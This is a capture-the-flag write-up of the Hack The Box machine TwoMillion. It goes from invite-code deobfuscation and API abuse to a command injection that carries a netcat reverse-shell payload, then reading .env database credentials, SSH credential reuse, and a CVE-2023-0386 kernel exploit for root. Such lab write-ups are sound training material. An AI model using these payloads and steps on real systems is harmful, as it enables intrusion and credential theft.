---
title: HTB TwoMillion - From Invite Code to Root
description: Tough-Process of how I solved this easy HTB machine through JavaScript deobfuscation, API enumeration, command injection, and a kernel vulnerability used for privilege escalation.
date: 2026-04-09
categories: [Tough-Process, HTB]
tags: [HTB, TwoMillion, Easy, JavaScript Deobfuscation, API Enumeration, Command Injection, CVE-2023-0386, Kernel Exploit]
image: /assets/img/posts/htb-twomillion/htb-twomillion-miniature.png
---

## Initial Recon
I started by checking connectivity with the machine by sending a ping.
```bash
mgo at parrot in ~/Documents/HTB/Machines/TwoMillion
○ ping -c1 10.129.25.17
PING 10.129.25.17 (10.129.25.17) 56(84) bytes of data.
64 bytes from 10.129.25.17: icmp_seq=1 ttl=63 time=48.2 ms

--- 10.129.25.17 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.213/48.213/48.213/0.000 ms
```
I confirmed connectivity to the machine. The ttl=63 value suggested the host was likely Linux-based, since Linux systems commonly default to TTL 64.

Then I launched a fast TCP SYN scan across all ports using `nmap`, just to see which ports were open. Keep in mind that this is very noisy and will probably get detected in real-world scenarios or more advanced CTFs.
```bash
mgo at parrot in ~/Documents/HTB/Machines/TwoMillion
○ sudo nmap -p- -sS -Pn -n --min-rate 3500 -oN recon/generic.nmap 10.129.25.17
[sudo] password for mgo: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 21:15 CEST
Nmap scan report for 10.129.25.17
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.55 seconds
```
After running the scan I saw that ports `22` and `80` were open.

Then I launched a TCP SYN scan with version detection and NSE scripts enabled targeted at the open ports to get more detailed info about them.
```bash
mgo at parrot in ~/Documents/HTB/Machines/TwoMillion
○ sudo nmap -p22,80 -sSVC -Pn -n -oN recon/specific.nmap 10.129.25.17
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 21:18 CEST
Nmap scan report for 10.129.25.17
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```
After the scan finished, I confirmed what I was suspecting, the target was running Linux, I also saw that the http was redirecting to a domain `2million.htb` so I added it to the `/etc/hosts` file.

```text
# HTB TwoMillion
10.129.25.17 2million.htb 
```

## Web page recon
Then I started manually inspecting the web application.
![main page](/assets/img/posts/htb-twomillion/main-page.png)
_Main Page_
After running Wappalyzer, checking robots, 404 page, reviewing the source code, testing common credentials, I found nothing interesting.

I then performed some directory fuzzing.
```bash
mgo at parrot in ~/Documents/HTB/Machines/TwoMillion
○ ffuf -u http://2million.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://2million.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

404                     [Status: 200, Size: 1674, Words: 118, Lines: 46, Duration: 80ms]
api                     [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 71ms]
home                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 76ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 78ms]
login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 71ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 73ms]
:: Progress: [4750/4750] :: Job [1/1] :: 542 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```
I started by doing an overview of each page, reviewing what each page did and testing its functionality.

On the `invite` page I tried multiple ways of entering the code, but none of them worked.
![invite page](/assets/img/posts/htb-twomillion/invite-page-fail.png)
_Invite Code Page_

![login page](/assets/img/posts/htb-twomillion/user-not-found.png)
_Login Page_

## JavaScript Deobfuscation
After testing some common credentials on the `login` page I saw the message `User not found` might be usable for username enumeration. After some time, I found an invite code verification API endpoint, `/api/v1/invite/verify` and an obfuscated JavaScript code.
```javascript
eval(function (p, a, c, k, e, d) {
  e = function (c) {
    return c.toString(36);
  };
  if (!"".replace(/^/, String)) {
    while (c--) {
      d[c.toString(a)] = k[c] || c.toString(a);
    }
    k = [function (e) {
      return d[e];
    }];
    e = function () {
      return "\\w+";
    };
    c = 1;
  }
  ;
  while (c--) {
    if (k[c]) {
      p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
    }
  }
  return p;
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, "response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify".split("|"), 0, {}))
```

After deobfuscating the script, I was left with the following code:
```javascript
function verifyInviteCode(code) {
  var formData = { "code": code };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function(response) { console.log(response) },
    error: function(response) { console.log(response) }
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/how/to/generate',
    success: function(response) { console.log(response) },
    error: function(response) { console.log(response) }
  });
}
```
I tried calling the function `makeInviteCode()` 
![makeInviteCode() console](/assets/img/posts/htb-twomillion/make-invite-code.png)
_Calling the function from the Browser console_
After calling the function, I received an obfuscated hint message, `Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr`, which I decoded using, `ROT13`, and got this `In order to generate the invite code, make a POST request to /api/v1/invite/generate`

So I called the endpoint `/api/v1/invite/generate` which returned an encoded invite code.
```bash
mgo at parrot in ~
○ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"MEdJTkgtMU0zWlQtVkxaRkktNzFFR1Q=","format":"encoded"}}% 
```

```bash
mgo at parrot in ~
○ echo "MEdJTkgtMU0zWlQtVkxaRkktNzFFR1Q=" | base64 -d
0GINH-1M3ZT-VLZFI-71EGT% 
```

After logging in, we land on the `home` page.
![makeInviteCode() console](/assets/img/posts/htb-twomillion/main-page-afterlogin.png)
After reviewing the page layout, inspecting the source code, performing subdomain/directory fuzzing, and testing features like the VPN generator, I still found nothing of interest. I also performed additional UDP enumeration looking for other exposed services, but found nothing interesting.

## API Enumeration
At this point I ran out of ideas, so I went back to enumeration and tried enumerating the API endpoints.
```bash
mgo at parrot in ~
○ curl http://2million.htb/api/v1 -b "PHPSESSID=o4tdb9mklj0hlvcen4k1me00gn"
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
After calling `/api/v1` it returns a list of all the available endpoints, so I tried calling them to check what they are doing.
```bash
mgo at parrot in ~
○ curl -b "PHPSESSID=o4tdb9mklj0hlvcen4k1me00gn" http://2million.htb/api/v1/admin/auth
{"message":false}
```
After calling `/api/v1/admin/auth` I suspected that it was a check to validate if the user is admin or not.

```bash
mgo at parrot in ~
○ curl -b "PHPSESSID=o4tdb9mklj0hlvcen4k1me00gn" http://2million.htb/api/v1/user/auth  
{"loggedin":true,"username":"gandon","is_admin":0}
```
`/api/v1/user/auth` returned information about the current logged user.

I tried calling `api/v1/admin/settings/update` even if I wasn't admin in case authorization checks were missing.
```bash
mgo at parrot in ~
○ curl -X PUT -b "PHPSESSID=o4tdb9mklj0hlvcen4k1me00gn" -H "Content-Type: application/json" -d '{"username":"gandon","is_admin":1}' http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Missing parameter: email"}
```
After calling it, I received a message saying that a parameter was missing, which made me suspect I could modify parameters even without admin privileges. So I tried calling it but with all parameters.
```bash
mgo at parrot in ~
○ curl -X PUT -b "PHPSESSID=o4tdb9mklj0hlvcen4k1me00gn" -H "Content-Type: application/json" -d '{"username":"gandon","is_admin":1,"email":"gandon@gandon.com"}' http://2million.htb/api/v1/admin/settings/update
{"id":13,"username":"gandon","is_admin":1}
```
It seemed that calling it changed the is_admin field to `1`, to confirm I called again the `/api/v1/admin/auth` endpoint.
```bash
mgo at parrot in ~
○ curl -b "PHPSESSID=o4tdb9mklj0hlvcen4k1me00gn" http://2million.htb/api/v1/admin/auth 
{"message":true}
```

## Command Injection
After testing other endpoints, I discovered the `/api/v1/admin/vpn/generate` endpoint that lets you generate a VPN file for a specific user, I suspected it was just running a command with the username as parameter to generate them, because it accepted usernames that did not exist, so I attempted command injection through the `username` parameter and executing a reverse shell.

```bash
mgo at parrot in ~
○ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.229.66 34792
sh: 0: can't access tty; job control turned off
```
_Started the listener on port 9001_

```bash
mgo at parrot in ~
○ curl -X POST -b "PHPSESSID=o4tdb9mklj0hlvcen4k1me00gn" http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"username":"gandon;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.182 9001 >/tmp/f"}'
```
_Launched the payload_

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
_Got a reverse shell as user `www-data`_

## Privilege Escalation
```bash
$ cat /etc/passwd
...
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
...
```
I found two interesting users, `admin` and `mysql` so I suspected there was a database running.

```bash
$ ls
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
```
I checked the `Database.php` file that looked interesting.
```bash
$ cat Database.php
<?php

class Database 
{
    private $host;
    private $user;
    private $pass;
    private $dbName;

    private static $database = null;
    
    private $mysql;

    public function __construct($host, $user, $pass, $dbName)
    {
        $this->host     = $host;
        $this->user     = $user;
        $this->pass     = $pass;
        $this->dbName   = $dbName;

        self::$database = $this;
    }

    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function connect()
    {
        $this->mysql = new mysqli($this->host, $this->user, $this->pass, $this->dbName);
    }

    public function query($query, $params = [], $return = true)
    {
        $types = "";
        $finalParams = [];

        foreach ($params as $key => $value)
        {
            $types .= str_repeat($key, count($value));
            $finalParams = array_merge($finalParams, $value);
        }

        $stmt = $this->mysql->prepare($query);
        $stmt->bind_param($types, ...$finalParams);

        if (!$stmt->execute())
        {
            return false;
        }

        if (!$return)
        {
            return true;
        }

        return $stmt->get_result() ?? false;
    }
}$ 
```
This file defined a Database class, so I suspected credentials were stored elsewhere in the application.

```bash
$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Apr 11 11:10 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Apr 11 11:10 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```
I immediately suspected the .env file contained the database credentials.
```bash
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Before trying to connect to the database, I tested if the credentials were also reused for SSH.
```bash
mgo at parrot in ~
○ ssh admin@10.129.229.66
The authenticity of host '10.129.229.66 (10.129.229.66)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.66' (ED25519) to the list of known hosts.
admin@10.129.229.66's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Apr 11 11:19:15 AM UTC 2026

  System load:           0.0
  Usage of /:            76.0% of 4.82GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.66
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c7c0

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```
The credentials were reused. Before continuing, I checked the database to see if there was some useful information in there.
```bash
admin@2million:~$ mysql -u admin -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 21249
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

No entry for terminal type "xterm-kitty";
using dumb terminal settings.
No entry for terminal type "xterm-kitty";
using dumb terminal settings.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb_prod           |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)
```

```sql
MariaDB [(none)]> USE htb_prod;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb_prod]> SHOW TABLES;
+--------------------+
| Tables_in_htb_prod |
+--------------------+
| invite_codes       |
| users              |
+--------------------+
2 rows in set (0.000 sec)
```

```sql
MariaDB [htb_prod]> SELECT * FROM users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | gandon       | gandon@gandon.com          | $2y$10$V2dvW8o7nNpCNSE3iD6Np.4RN62aQ9buUKXpZd7aLe3qQ78XogMVq |        1 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
3 rows in set (0.001 sec)
```
I was able to enumerate usernames, email addresses, and password hashes of the users registered on the page and the invite codes.

I continued with manual privilege escalation before running some automated scripts.
```bash
admin@2million:~$ sudo -l
[sudo] password for admin: 
Sorry, user admin may not run sudo on localhost.
```
_Checking if admin can run sudo_
```bash
admin@2million:~$ find / -type f -perm -04000 -ls 2>/dev/null
      297    129 -rwsr-xr-x   1 root     root       131832 Apr 18  2023 /snap/snapd/19122/usr/lib/snapd/snap-confine
      821     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1891/usr/bin/chfn
      827     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1891/usr/bin/chsh
      896     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1891/usr/bin/gpasswd
      980     55 -rwsr-xr-x   1 root     root        55528 Feb  7  2022 /snap/core20/1891/usr/bin/mount
      989     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1891/usr/bin/newgrp
     1004     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1891/usr/bin/passwd
     1114     67 -rwsr-xr-x   1 root     root        67816 Feb  7  2022 /snap/core20/1891/usr/bin/su
     1115    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1891/usr/bin/sudo
     1173     39 -rwsr-xr-x   1 root     root        39144 Feb  7  2022 /snap/core20/1891/usr/bin/umount
     1262     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1634    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1891/usr/lib/openssh/ssh-keysign
      842     40 -rwsr-xr-x   1 root     root               40496 Nov 24  2022 /usr/bin/newgrp
      697     72 -rwsr-xr-x   1 root     root               72072 Nov 24  2022 /usr/bin/gpasswd
     1111     56 -rwsr-xr-x   1 root     root               55672 Feb 21  2022 /usr/bin/su
     1187     36 -rwsr-xr-x   1 root     root               35192 Feb 21  2022 /usr/bin/umount
      573     44 -rwsr-xr-x   1 root     root               44808 Nov 24  2022 /usr/bin/chsh
      681     36 -rwsr-xr-x   1 root     root               35200 Mar 23  2022 /usr/bin/fusermount3
     2484    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
      876     60 -rwsr-xr-x   1 root     root               59976 Nov 24  2022 /usr/bin/passwd
      830     48 -rwsr-xr-x   1 root     root               47480 Feb 21  2022 /usr/bin/mount
      567     72 -rwsr-xr-x   1 root     root               72712 Nov 24  2022 /usr/bin/chfn
     1409     36 -rwsr-xr--   1 root     messagebus         35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    28894    136 -rwsr-xr-x   1 root     root              138408 May 29  2023 /usr/lib/snapd/snap-confine
     1603    332 -rwsr-xr-x   1 root     root              338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
    13665     20 -rwsr-xr-x   1 root     root               18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
```
_Looking for some files with permissions that can be abused to gain more privileges_
```bash
admin@2million:~$ getcap -r / 2>/dev/null
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
```
_Looking for some capabilities that can be abused to gain more privileges_

```bash
admin@2million:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
_Checking scheduled cron jobs_

```bash
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
_Checking the kernel version_

After searching for the kernel version, I found it might be vulnerable to the OverlayFS privilege escalation vulnerability (`CVE-2023-0386`), I found this [PoC](https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c) so I decided to try it.

> CVE-2023-0386 abuses improper permission handling in OverlayFS when copying files from a mounted filesystem, allowing privilege escalation through crafted SUID files.
{: .prompt-info }

```bash
admin@2million:~$ ./poc 
Waiting 1 sec...
unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=/tmp/ovlcap/lower,upperdir=/tmp/ovlcap/upper,workdir=/tmp/ovlcap/work /tmp/ovlcap/merge && ls -la /tmp/ovlcap/merge && touch /tmp/ovlcap/merge/file'
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Apr 11 11:43 .
drwxrwxr-x 6 root   root     4096 Apr 11 11:43 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read_callback
    cnt  : 0
    clen  : 0
    path  : /file
    size  : 0x4000
    offset: 0x0
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
/tmp/ovlcap/upper/file
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```
Running the exploit resulted in a root shell.
```bash
root@2million:~# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

## Conclusion
This machine was a really fun challenge and a good reminder that simple enumeration can often lead to critical vulnerabilities. From JavaScript deobfuscation and API enumeration to command injection and kernel exploitation, every step helped me practice a different skill.

By no means am I a professional pentester, I am still learning, and this post reflects my thought process while solving the machine. The goal of this write-up was to document the path I followed, including the dead ends and the reasoning behind each step.

I also recommend researching `CVE-2023-0386` and the OverlayFS exploitation process further, since I could not fully explain the internals of the exploit in this post without making it excessively long. Understanding how the vulnerability works behind the scenes is definitely worth the time.

Attack Chain:
1. JavaScript deobfuscation revealed hidden invite endpoints
2. API enumeration exposed undocumented admin functionality
3. Broken authorization allowed privilege escalation to admin
4. Command injection in VPN generation yielded RCE
5. Credential reuse provided SSH access
6. OverlayFS vulnerability (CVE-2023-0386) led to root